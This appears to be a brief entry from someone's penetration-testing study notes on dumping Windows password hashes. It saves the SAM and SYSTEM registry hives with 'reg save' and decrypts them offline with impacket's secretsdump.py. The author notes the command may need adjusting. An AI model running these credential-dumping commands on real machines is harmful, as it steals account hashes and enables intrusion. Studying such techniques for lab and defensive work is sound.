we could also try to dump the SAM database using registry hives, by doing:

reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
reg save HKLM\system C:\users\Administrator\Desktop\system-reg

then, we can decrypt it using one of the impacket tools (secretsdump.py)
python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
(command could be iffy, update it accordingly. think i covered this in
exploiting AD too)
